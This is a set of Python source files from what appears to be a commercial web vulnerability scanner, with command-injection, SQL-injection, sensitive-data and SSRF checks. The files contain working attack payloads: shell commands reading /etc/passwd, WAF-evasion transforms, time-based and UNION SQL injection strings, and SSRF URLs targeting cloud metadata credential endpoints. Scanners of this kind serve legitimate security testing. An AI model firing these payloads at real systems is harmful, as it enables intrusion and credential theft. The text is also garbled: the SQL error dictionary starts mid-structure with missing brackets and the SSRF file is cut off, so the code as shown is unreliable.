FILE: modules/scanner/checks/rce.py
--------------------------------------------------------------------------------
"""RCE — Remote Code Execution / Command Injection (CWE-78).

Improvements:
- Regex-based payload→signature mapping (no FP on 'root' in HTML)
- WAF bypass transforms (space substitution, quote bypass, encoding)
- Time-based blind detection
- Filter bypass variants (IFS, quoting, hex encoding)
"""
from __future__ import annotations

import re
import statistics
import time
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse


# ── Response signatures ────────────────────────────────────────────────────────

# Regex patterns for OS command output — highly specific, won't match normal HTML
_ID_PATTERN     = re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+")
_WHOAMI_PATTERN = re.compile(r"(?m)^(root|www-data|apache|nginx|nobody|daemon|web|http|postgres|mysql|ftp)\s*$")
_PASSWD_PATTERN = re.compile(r"[\w-]+:[x*!]:\d+:\d+:[^:]*:[/\w-]+:[/\w-]+")
_WINI_PATTERN   = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
_WIN_WHOAMI_PATTERN = re.compile(r"(?:NT AUTHORITY|BUILTIN|[\w]+\\[\w]+)\\[\w]+", re.I)
_UNAME_PATTERN  = re.compile(r"Linux\s+[\w.-]+\s+\d+\.\d+\.\d+")

# Map payload categories to detection patterns
_PAYLOAD_PATTERNS: list[tuple[re.Pattern, re.Pattern, str]] = [
    # (payload_match, output_match, description)
    (re.compile(r"\bid\b"),        _ID_PATTERN,     "id command output"),
    (re.compile(r"\bwhoami\b"),    _WHOAMI_PATTERN, "whoami output"),
    (re.compile(r"whoami"),        _WIN_WHOAMI_PATTERN, "Windows whoami output"),
    (re.compile(r"passwd"),        _PASSWD_PATTERN, "/etc/passwd contents"),
    (re.compile(r"win\.ini", re.I), _WINI_PATTERN,  "Windows win.ini contents"),
    (re.compile(r"\buname\b"),     _UNAME_PATTERN,  "uname output"),
]

# Generic fallback — checked when payload doesn't match any category
_GENERIC_PATTERNS: list[tuple[re.Pattern, str]] = [
    (_ID_PATTERN,       "id command output"),
    (_PASSWD_PATTERN,   "/etc/passwd contents"),
    (_WINI_PATTERN,     "Windows win.ini contents"),
    (_UNAME_PATTERN,    "uname output"),
    (_WIN_WHOAMI_PATTERN, "Windows whoami"),
]

# Built-in payload list (loaded before yaml file to guarantee coverage)
_BUILTIN_PAYLOADS = [
    ";id", "&&id", "|id", "$(id)", "`id`",
    "1;id", "1|id", "1$(id)",
    "\nid", "\r\nid",
    ";whoami", "&&whoami", "|whoami",
    ";cat /etc/passwd", "|cat /etc/passwd",
    "; id", "& id", "|| id",
    ";id%09", ";${IFS}id",
    "& whoami", "| whoami",
    "; uname -a", "| uname -a",
]


def _check_rce_response(payload: str, body: str) -> str | None:
    """Return evidence description if RCE confirmed, else None."""
    # Try payload-specific patterns first
    for pl_pat, out_pat, desc in _PAYLOAD_PATTERNS:
        if pl_pat.search(payload):
            if out_pat.search(body):
                return desc
            return None  # payload matched a category but output not found → not this check

    # Fallback: generic patterns for unknown payloads
    for pat, desc in _GENERIC_PATTERNS:
        if pat.search(body):
            return desc
    return None


# ── WAF bypass transforms ──────────────────────────────────────────────────────

_WAF_STATUS = {403, 406, 429, 501, 503}

_SPACE_BYPASSES = [
    "${IFS}",
    "\t",
    "\n",
    "<",     # bash: cmd<arg works without space
    "{,}",   # brace expansion: {cmd}
    "%09",   # URL-encoded tab
    "%0a",   # URL-encoded newline
]

def _waf_variants(payload: str) -> list[str]:
    """Generate WAF bypass variants of a payload."""
    variants = []
    seen = {payload}

    def add(p: str) -> None:
        if p not in seen:
            seen.add(p)
            variants.append(p)

    # Space substitution
    if " " in payload:
        for bypass in _SPACE_BYPASSES:
            add(payload.replace(" ", bypass))

    # Quote injection to bypass string matching WAFs
    for cmd in ("id", "whoami", "cat", "ping", "curl", "wget", "sleep"):
        if cmd in payload:
            # Split command with empty string var: i''d → id
            add(payload.replace(cmd, cmd[:1] + "''" + cmd[1:]))
            # Shell variable: ${HOME%%*} empty → id = i$((1-1))d etc.
            # Simpler: hex encoding
            hex_cmd = "".join(f"\\x{ord(c):02x}" for c in cmd)
            add(payload.replace(cmd, f"$'{hex_cmd}'"))
            # Brace expansion: {id} → id
            add(payload.replace(cmd, f"{{'{cmd}'}}"))
            break

    # Semicolon bypass
    for sep in (";", "|", "&&", "||"):
        if payload.startswith(sep):
            # Try adding prefix digit to confuse parsers
            add(f"1{payload}")
            add(f"a{payload}")
            break

    # Newline injection variants
    add(payload.replace(";", "%0a"))
    add(payload.replace(";", "\n"))
    add(payload.replace(";", "%0d%0a"))

    return variants[:8]  # cap to avoid explosion


# ── Time-based blind RCE payloads ──────────────────────────────────────────────

_TIME_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",  # Windows
    "%0asleep%205",
    "${IFS}sleep${IFS}5",
    "; sleep${IFS}5",
]

# Windows polyglots (C.4)
_WINDOWS_PAYLOADS = [
    "& whoami",
    "| whoami",
    "&& whoami",
    "|| whoami",
    "; whoami",
    "& dir",
    "| dir",
    "& type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "& echo %USERDOMAIN%\\%USERNAME%",
    "| echo %USERDOMAIN%\\%USERNAME%",
    "& ver",
    "| ver",
    "1 & whoami",
    "1 | whoami",
    "a & whoami",
    "a | whoami",
]

_WIN_CONFIRM_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"NT AUTHORITY\\|BUILTIN\\|[\w]+\\[\w]+", re.I), "Windows whoami output"),
    (re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I), "Windows win.ini"),
    (re.compile(r"Microsoft Windows \[Version", re.I), "Windows ver output"),
    (re.compile(r"Volume in drive [A-Z] is", re.I), "Windows dir output"),
]


# ── Check class ────────────────────────────────────────────────────────────────

class RCECheck(BaseCheck):
    name = "rce"
    description = "RCE — Command Injection (error-based + WAF bypass + time-based blind)"
    severity = "critical"
    passive = False
    cwe = "CWE-78"
    mitre_attack = "T1059"
    uses_scan_pipeline = True  # scan() has multi-phase logic

    def get_payloads(self) -> list[str]:
        return _BUILTIN_PAYLOADS + load_payloads("rce")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        desc = _check_rce_response(payload, body)
        if not desc:
            return None

        # Build evidence snippet
        evidence = f"[{point.kind}:{point.name}] {desc}"
        for pat, _ in _GENERIC_PATTERNS:
            m = pat.search(body)
            if m:
                idx = m.start()
                ctx = body[max(0, idx - 20): min(len(body), idx + len(m.group()) + 20)]
                evidence += f": …{ctx.replace(chr(10), ' ')}…"
                break

        from pentool.utils.parser import build_http_request
        return Finding(
            type="rce",
            name=f"RCE / Command Injection ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=evidence,
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=f"RCE in {point.kind} '{point.name}'. OS command executed: {desc}.",
            remediation="Never pass user input to OS commands. Use allowlists.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []

        for point in mutator.extract_points(request):
            # ── Phase 1: error-based + WAF bypass ────────────────────────────
            found = False
            for payload in self.get_payloads():
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    status = get_status(resp)

                    # WAF blocked → try bypass variants
                    if status in _WAF_STATUS:
                        for variant in _waf_variants(payload):
                            mutated_v = mutator.mutate(request, point, variant)
                            try:
                                resp_v = await http_client.send(mutated_v)
                                f = await self.analyze(request, mutated_v, point, variant, resp_v)
                                if f:
                                    findings.append(f)
                                    found = True
                                    break
                            except Exception:
                                pass
                        if found:
                            break
                        continue

                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        found = True
                        break
                except Exception:
                    pass
            if found:
                continue

            # ── Phase 2: time-based blind ─────────────────────────────────────
            f = await self._time_blind(request, point, mutator, http_client)
            if f:
                findings.append(f)

        return findings

    async def _time_blind(self, request, point, mutator, http_client) -> "Finding | None":
        # Baseline: 3 samples
        times = []
        for _ in range(3):
            try:
                t0 = time.monotonic()
                await http_client.send(request)
                times.append(time.monotonic() - t0)
            except Exception:
                times.append(1.0)
        baseline = statistics.median(times)
        threshold = max(baseline * 2 + 3.5, 4.8)

        for payload in _TIME_PAYLOADS:
            all_tried = [payload] + _waf_variants(payload)
            for p in all_tried:
                mutated = mutator.mutate(request, point, p)
                try:
                    t0 = time.monotonic()
                    resp = await http_client.send(mutated)
                    elapsed = time.monotonic() - t0
                    if elapsed >= threshold:
                        from pentool.utils.parser import build_http_request
                        return Finding(
                            type="rce",
                            name=f"RCE Time-based Blind ({point.kind.upper()})",
                            url=mutated.url,
                            severity=self.severity,
                            parameter=point.name,
                            payload=p,
                            evidence=(
                                f"[{point.kind}:{point.name}] Response delayed {elapsed:.2f}s "
                                f"(baseline {baseline:.2f}s, threshold {threshold:.2f}s)"
                            ),
                            cwe=self.cwe,
                            mitre_attack=self.mitre_attack,
                            description=(
                                f"Time-based blind RCE in {point.kind} '{point.name}'. "
                                f"OS sleep/ping caused {elapsed:.2f}s delay."
                            ),
                            remediation="Never pass user input to OS commands.",
                            request_raw=build_http_request(mutated),
                            response_raw=format_response_raw(resp),
                        )
                except Exception:
                    pass
        return None

"""Sensitive Data Exposure — passive check extension (B.6).

Scans response body for secrets, credentials, internal IPs, and PII patterns.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_PATTERNS: list[tuple[str, re.Pattern, str]] = [
    ("AWS Access Key",      re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"),                                  "high"),
    ("AWS Secret Key",      re.compile(r"(?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])"),      "high"),
    ("Private Key",         re.compile(r"-----BEGIN (?:RSA|EC|OPENSSH|DSA) PRIVATE KEY-----"),          "critical"),
    ("JWT Token",           re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), "medium"),
    ("GitHub Token",        re.compile(r"gh[ps]_[A-Za-z0-9_]{36,255}"),                                "high"),
    ("Slack Token",         re.compile(r"xox[baprs]-[0-9]{12}-[0-9]{12}"),                             "high"),
    ("Google API Key",      re.compile(r"AIza[0-9A-Za-z_-]{35}"),                                      "high"),
    ("Stripe Secret",       re.compile(r"sk_(?:live|test)_[0-9a-zA-Z]{24,}"),                          "critical"),
    ("DB Connection String",re.compile(r"(?:mysql|postgres|mongodb)://[^:]+:[^@]+@"),                   "critical"),
    ("Password in JSON",    re.compile(r'"(?:password|passwd|pwd|secret|api_key)"\s*:\s*"[^"]{3,}"', re.I), "high"),
    ("Internal IP",         re.compile(r"\b(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b"), "low"),
]


class SensitiveDataCheck(BaseCheck):
    """Passive: scan response for secrets and sensitive data patterns."""
    name = "sensitive_data"
    description = "Sensitive Data Exposure — secrets, credentials, internal IPs (CWE-200)"
    severity = "high"
    passive = True
    cwe = "CWE-200"
    mitre_attack = "T1552"

    async def scan(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
        http_client: "HTTPClient",
        **kwargs,
    ) -> list[Finding]:
        if response is None:
            return []
        body = get_body(response)
        if not body:
            return []

        findings: list[Finding] = []
        seen: set[str] = set()

        for label, pat, severity in _PATTERNS:
            m = pat.search(body)
            if m and label not in seen:
                seen.add(label)
                findings.append(Finding(
                    type="sensitive_data",
                    name=f"Sensitive Data Exposure: {label}",
                    url=request.url,
                    severity=severity,
                    parameter="(response body)",
                    payload="(passive)",
                    evidence=m.group(0)[:80],
                    cwe=self.cwe,
                    description=f"{label} found in response body.",
                    remediation="Remove sensitive data from responses. Use environment variables for secrets.",
                ))

        return findings

"""SQLi — SQL Injection (CWE-89): error-based + boolean blind + time-based + WAF bypass."""

from __future__ import annotations

import re
import statistics
import time
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, get_response_length, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── DB error fingerprints ──────────────────────────────────────────────────────

        r"invalid input syntax for (type )?integer",
        r"ERROR:  column .* does not exist",
        r"PG::SyntaxError",
        r"Warning: pg_",
    ],
    "mssql": [
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"OLE DB.*SQL Server",
        r"Microsoft.*ODBC.*SQL Server",
        r"SqlException.*Incorrect syntax",

    "oracle": [

        r"ORA-00907: missing right parenthesis",
        r"ORA-01756",

    "sqlite": [
        r"SQLite3::",
        r"near \".*\": syntax error",
        r"\[SQLITE_ERROR\]",

    # C.1 — extended DB types
    "mariadb": [
        r"MariaDB server version for the right syntax",
        r"You have an error in your SQL syntax.*MariaDB",
        r"Table '.*' doesn't exist.*MariaDB",
    ],
    "clickhouse": [
        r"DB::Exception",
        r"Code: 62\. DB::Exception",
        r"Syntax error: failed at position",
        r"ClickHouse exception",
    ],
    "cockroachdb": [
        r"pq: syntax error at or near",
        r"CockroachDB",
        r"ERROR: at or near",
    ],
    "snowflake": [
        r"SQL compilation error",
        r"Object '.*' does not exist or not authorized",
        r"Snowflake.*exception",
    ],
    "sap_hana": [
        r"SAP DBTech",
        r"SAP HANA",
        r"\[HDB\] \[42\d+\]",
        r"JDBCSQLException.*SAP",
    ],
    "ibm_db2": [
        r"DB2 SQL Error",
        r"SQLCODE",
        r"SQLSTATE.*IBM",
        r"com\.ibm\.db2",
        r"CLI0112E",
    ],
    "firebird": [
        r"Dynamic SQL Error",
        r"token unknown",
        r"FirebirdException",
        r"isc_dsql_prepare",
        r"GDS Exception",
    ],
    "generic": [
        r"SQL syntax",
        r"SQLSTATE\[",
        r"java\.sql\.SQLException",
        r"Syntax error or access violation",
        r"DB Error",
        r"Invalid SQL",
        r"unexpected end of SQL command",
        r"error in your SQL syntax",
    ],
}

# Compiled once at import
_DB_COMPILED: dict[str, list[re.Pattern]] = {
    db: [re.compile(p, re.I | re.S) for p in patterns]
    for db, patterns in _DB_ERRORS.items()
}

# ── Quote probes ───────────────────────────────────────────────────────────────

_QUOTE_PROBES = ["'", '"', "`", " 1"]

# ── Boolean blind pairs ────────────────────────────────────────────────────────

_BOOL_PAIRS: dict[str, list[tuple[str, str]]] = {
    "single": [
        ("' AND '1'='1", "' AND '1'='2"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ("' OR '1'='1'--", "' OR '1'='2'--"),
    ],
    "double": [
        ('" AND "1"="1', '" AND "1"="2'),
        ('1" AND 1=1--', '1" AND 1=2--'),
    ],
    "numeric": [
        ("1 AND 1=1", "1 AND 1=2"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("1 AND 1=1--", "1 AND 1=2--"),
    ],
}

# ── Time-based payloads ────────────────────────────────────────────────────────

_TIME_PAYLOADS: dict[str, list[str]] = {
    "mysql":      ["' AND SLEEP(5)--", "1 AND SLEEP(5)", "' OR SLEEP(5)--",
                   "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
    "postgresql": ["'; SELECT pg_sleep(5)--", "1; SELECT pg_sleep(5)--",
                   "' OR pg_sleep(5)--"],
    "mssql":      ["'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--"],
    "oracle":     ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99),5)--"],
    "sqlite":     ["' AND 1=(SELECT 1 FROM sqlite_master WHERE LIKE('a%a',UPPER(HEX(RANDOMBLOB(50000000/2))))='') --"],
    "generic":    ["' AND SLEEP(5)--", "1 AND SLEEP(5)--",
                   "'; SELECT pg_sleep(5)--", "1; WAITFOR DELAY '0:0:5'--"],
}

# ── WAF indicators & transforms ────────────────────────────────────────────────

_WAF_STATUS = {403, 406, 429, 501, 503}

_WAF_TRANSFORMS = [
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.replace(" ", "%0a"),
    lambda p: p.replace(" ", "%0d%0a"),
    lambda p: re.sub(r'\bUNION\b', 'UnIoN', p, flags=re.I),
    lambda p: re.sub(r'\bSELECT\b', 'SEL/**/ECT', p, flags=re.I),
    lambda p: re.sub(r'\bAND\b', '&&', p, flags=re.I),
    lambda p: re.sub(r'\bOR\b', '||', p, flags=re.I),
    lambda p: p.replace("=", " LIKE "),
    lambda p: p.replace("'", "0x27"),
    lambda p: re.sub(r'UNION SELECT', 'UNION%23\nSELECT', p, flags=re.I),
    lambda p: p.upper(),
]


def _detect_db(body: str) -> str:
    """Return detected DB type or 'generic'."""
    for db, patterns in _DB_COMPILED.items():
        for pat in patterns:
            if pat.search(body):
                return db
    return "generic"


def _has_db_error(body: str) -> tuple[bool, str]:
    """Return (found, matched_pattern_str)."""
    for db, patterns in _DB_COMPILED.items():
        for pat in patterns:
            m = pat.search(body)
            if m:
                return True, m.group(0)[:80]
    return False, ""


def _is_waf_blocked(status: int) -> bool:
    return status in _WAF_STATUS


def _waf_variants(payload: str) -> list[str]:
    seen = set()
    result = []
    for transform in _WAF_TRANSFORMS:
        try:
            v = transform(payload)
            if v != payload and v not in seen:
                seen.add(v)
                result.append(v)
        except Exception:
            pass
    return result


# ── Check class ────────────────────────────────────────────────────────────────

class SQLiCheck(BaseCheck):
    name = "sqli"
    description = "SQL Injection — error-based, boolean blind, time-based, WAF bypass"
    severity = "high"
    passive = False
    cwe = "CWE-89"
    mitre_attack = "T1190"
    uses_scan_pipeline = True  # engine calls scan() -> multi-phase logic

    def get_payloads(self) -> list[str]:
        return load_payloads("sqli")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, sig = _has_db_error(body)
        if not found:
            return None
        from pentool.utils.parser import build_http_request
        return Finding(
            type="sqli",
            name=f"SQL Injection Error-based ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=f"[{point.kind}:{point.name}] DB error: '{sig}'",
            cwe=self.cwe,
            description=(
                f"SQL injection in {point.kind} param '{point.name}'. "
                f"DB error signature matched: '{sig}'"
            ),
            remediation="Use parameterized queries / prepared statements.",
            mitre_attack=self.mitre_attack,
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator

        # Per-point mode: engine passes a specific point — work with it only
        point = kwargs.get("point")
        if point is not None:
            mutator = kwargs.get("mutator") or RequestMutator()
            f = await self._scan_point(request, point, mutator, http_client)
            return [f] if f else []

        # Fallback: global mode — iterate all points ourselves (backward compatibility)
        mutator = RequestMutator()
        findings = []
        for p in mutator.extract_points(request):
            f = await self._scan_point(request, p, mutator, http_client)
            if f:
                findings.append(f)
        return findings

    async def _scan_point(self, request, point, mutator, http_client) -> "Finding | None":
        # ── Baseline ─────────────────────────────────────────────────────────
        try:
            baseline_resp = await http_client.send(request)
            baseline_body = get_body(baseline_resp)
            baseline_len  = len(baseline_body)
            baseline_status = get_status(baseline_resp)
        except Exception:
            baseline_body = ""
            baseline_len  = 0
            baseline_status = 200

        detected_db: str = "generic"

        # ── Phase 1: error-based ──────────────────────────────────────────────
        for payload in self.get_payloads():
            mutated = mutator.mutate(request, point, payload)
            try:
                resp = await http_client.send(mutated)
                status = get_status(resp)
                body   = get_body(resp)

                # WAF blocked -> try bypass variants
                if _is_waf_blocked(status):
                    for variant in _waf_variants(payload):
                        mutated_v = mutator.mutate(request, point, variant)
                        try:
                            resp_v = await http_client.send(mutated_v)
                            body_v = get_body(resp_v)
                            found, sig = _has_db_error(body_v)
                            if found:
                                detected_db = _detect_db(body_v)
                                from pentool.utils.parser import build_http_request
                                return Finding(
                                    type="sqli",
                                    name=f"SQL Injection Error-based WAF-bypass ({point.kind.upper()})",
                                    url=mutated_v.url,
                                    severity=self.severity,
                                    parameter=point.name,
                                    payload=variant,
                                    evidence=f"[{point.kind}:{point.name}] WAF bypassed, DB({detected_db}) error: '{sig}'",
                                    cwe=self.cwe,
                                    description=f"SQLi in {point.kind} '{point.name}' bypassing WAF. DB: {detected_db}.",
                                    remediation="Use parameterized queries / prepared statements.",
                                    mitre_attack=self.mitre_attack,
                                    request_raw=build_http_request(mutated_v),
                                    response_raw=format_response_raw(resp_v),
                                )
                        except Exception:
                            pass
                    continue

                found, sig = _has_db_error(body)
                if found:
                    detected_db = _detect_db(body)
                    from pentool.utils.parser import build_http_request
                    return Finding(
                        type="sqli",
                        name=f"SQL Injection Error-based ({point.kind.upper()})",
                        url=mutated.url,
                        severity=self.severity,
                        parameter=point.name,
                        payload=payload,
                        evidence=f"[{point.kind}:{point.name}] DB({detected_db}) error: '{sig}'",
                        cwe=self.cwe,
                        description=f"SQLi in {point.kind} '{point.name}'. DB: {detected_db}.",
                        remediation="Use parameterized queries / prepared statements.",
                        mitre_attack=self.mitre_attack,
                        request_raw=build_http_request(mutated),
                        response_raw=format_response_raw(resp),
                    )
            except Exception:
                pass

        # ── Phase 2: quote-type detection -> boolean blind ────────────────────
        detected_quote: str | None = None
        for probe in _QUOTE_PROBES:
            mutated = mutator.mutate(request, point, probe)
            try:
                resp = await http_client.send(mutated)
                body = get_body(resp)
                resp_len = len(body)
                # Quote breaks SQL if: DB error, status change, or significant body diff
                if _has_db_error(body)[0]:
                    detected_db = _detect_db(body)
                    detected_quote = "single" if probe == "'" else "double" if probe == '"' else "numeric"
                    break
                if (get_status(resp) != baseline_status
                        or abs(resp_len - baseline_len) > max(baseline_len * 0.1, 50)):
                    detected_quote = "single" if probe == "'" else "double" if probe == '"' else "numeric"
            except Exception:
                pass

        quote_type = detected_quote or "numeric"
        f = await self._boolean_blind(request, point, mutator, http_client,
                                      baseline_len, baseline_body, quote_type)
        if f:
            return f

        # ── Phase 3: time-based blind ─────────────────────────────────────────
        return await self._time_blind(request, point, mutator, http_client, detected_db)

    async def _boolean_blind(self, request, point, mutator, http_client,
                              baseline_len: int, baseline_body: str,
                              quote_type: str) -> "Finding | None":
        pairs = _BOOL_PAIRS.get(quote_type, _BOOL_PAIRS["numeric"])
        for p_true, p_false in pairs:
            try:
                r_true  = await http_client.send(mutator.mutate(request, point, p_true))
                r_false = await http_client.send(mutator.mutate(request, point, p_false))
                len_true  = get_response_length(r_true)
                len_false = get_response_length(r_false)
                if len_true <= 0 or len_false <= 0:
                    continue
                # TRUE closer to baseline; FALSE significantly different
                diff_true  = abs(len_true  - baseline_len)
                diff_false = abs(len_false - baseline_len)
                max_len    = max(len_true, len_false, baseline_len, 1)
                ratio      = abs(len_true - len_false) / max_len
                if ratio > 0.15 and diff_false > diff_true and diff_false > 30:
                    m = mutator.mutate(request, point, p_true)
                    from pentool.utils.parser import build_http_request
                    return Finding(
                        type="sqli",
                        name=f"SQL Injection Boolean Blind ({point.kind.upper()})",
                        url=m.url,
                        severity=self.severity,
                        parameter=point.name,
                        payload=f"TRUE: {p_true} / FALSE: {p_false}",
                        evidence=(
                            f"baseline={baseline_len}b TRUE={len_true}b "
                            f"FALSE={len_false}b delta={ratio:.0%}"
                        ),
                        cwe=self.cwe,
                        description=(
                            f"Boolean blind SQLi in {point.kind} '{point.name}'. "
                            f"Response length differs {ratio:.0%} between TRUE/FALSE."
                        ),
                        remediation="Use parameterized queries / prepared statements.",
                        mitre_attack=self.mitre_attack,
                        request_raw=build_http_request(m),
                    )
            except Exception:
                pass
        return None

    async def _time_blind(self, request, point, mutator, http_client,
                          detected_db: str) -> "Finding | None":
        # Measure baseline time (3 samples)
        times = []
        for _ in range(3):
            try:
                t0 = time.monotonic()
                await http_client.send(request)
                times.append(time.monotonic() - t0)
            except Exception:
                times.append(1.0)
        baseline = statistics.median(times)
        threshold = max(baseline * 2 + 3.0, 4.5)

        # Try DB-specific payloads first, then generic
        db_order = [detected_db] if detected_db != "generic" else []
        db_order += [d for d in _TIME_PAYLOADS if d != detected_db]

        for db in db_order:
            for payload in _TIME_PAYLOADS.get(db, []):
                mutated = mutator.mutate(request, point, payload)
                all_tried = [payload] + _waf_variants(payload)
                for p in all_tried:
                    mutated = mutator.mutate(request, point, p)
                    try:
                        t0 = time.monotonic()
                        resp = await http_client.send(mutated)
                        elapsed = time.monotonic() - t0
                        if elapsed >= threshold:
                            from pentool.utils.parser import build_http_request
                            return Finding(
                                type="sqli",
                                name=f"SQL Injection Time-based Blind ({point.kind.upper()})",
                                url=mutated.url,
                                severity=self.severity,
                                parameter=point.name,
                                payload=p,
                                evidence=(
                                    f"Response delayed {elapsed:.2f}s "
                                    f"(baseline {baseline:.2f}s, threshold {threshold:.2f}s, DB guess: {db})"
                                ),
                                cwe=self.cwe,
                                description=(
                                    f"Time-based blind SQLi in {point.kind} '{point.name}'. "
                                    f"Payload caused {elapsed:.2f}s delay."
                                ),
                                remediation="Use parameterized queries / prepared statements.",
                                mitre_attack=self.mitre_attack,
                                request_raw=build_http_request(mutated),
                                response_raw=format_response_raw(resp),
                            )
                    except Exception:
                        pass
        return None


# ── Union extraction payloads (C.1, PRO) ──────────────────────────────────────

_UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION ALL SELECT NULL--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT 1,2--",
    "1 UNION SELECT 1,2,3--",
]


class SQLiUnionCheck(BaseCheck):
    """SQLi Union Extraction — PRO feature."""
    name = "sqli_union"
    description = "SQL Injection Union Extraction (CWE-89) — PRO"
    severity = "high"
    cwe = "CWE-89"
    mitre_attack = "T1190"
    required_feature = "scanner_sqli_union"
    required_plan = "pro"
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _UNION_PAYLOADS

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, sig = _has_db_error(body)
        if found:
            return Finding(
                type="sqli_union",
                name=f"SQL Injection Union-based ({point.kind.upper()})",
                url=mutated_req.url,
                severity=self.severity,
                parameter=point.name,
                payload=payload,
                evidence=sig,
                cwe=self.cwe,
                description=f"Union-based SQLi in {point.kind} '{point.name}'.",
                remediation="Use parameterized queries / prepared statements.",
                request_raw=format_response_raw(mutated_req),
                response_raw=body[:500],
            )
        return None

    async def scan(self, request, response, http_client, **kwargs):
        return []

FILE: modules/scanner/checks/ssrf.py

"""SSRF — Server-Side Request Forgery (CWE-918)."""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw
from pentool.modules.scanner.oob import get_oob_helper

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── Cloud metadata URLs ────────────────────────────────────────────────────────

_CLOUD_METADATA = [
    # AWS EC2
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/user-data",
    # AWS ECS task credentials
    "http://169.254.170.2/v2/credentials",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    # Kubernetes
    "https://kubernetes.default.svc/api/",
    "http://10.96.0.1/api/v1/namespaces/default/secrets",
]

_PROTOCOL_URLS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "dict://localhost:6379/info",          # Redis INFO
    "dict://localhost:11211/stats",        # Memcached
    "dict://127.0.0.1:6379/info",
    "gopher://localhost:6379/_PING%0D%0A", # Redis via Gopher
    "gopher://127.0.0.1:9200/_cat/indices", # Elasticsearch
